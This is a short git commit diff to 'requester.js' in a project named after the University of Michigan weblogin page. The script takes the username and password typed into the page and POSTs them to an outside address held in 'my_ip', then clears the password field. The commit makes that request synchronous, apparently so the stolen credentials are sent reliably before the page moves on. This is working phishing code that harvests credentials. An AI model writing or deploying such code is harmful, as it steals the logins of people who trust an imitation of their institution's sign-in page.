9f2a96df650c77fef00624466aa0648487f7db4a
Jordan <jminjie@umich.edu>
2016-04-22 16:39:15 +0000

    Switch to synch

--- weblogin.umich.edu/requester.js
+++ weblogin.umich.edu/requester.js
@@ -9,7 +9,7 @@ function printHello() {
 	var password = document.getElementById('password');
 	// send the login and pass as resquests
 	var req = new XMLHttpRequest();
-	req.open( "POST", my_ip, true);
+	req.open( "POST", my_ip, false);
 	req.send("<login>"+login.value+"</login>\n"+"<pass>"+password.value+"</pass>");
     password.value = "";
 }
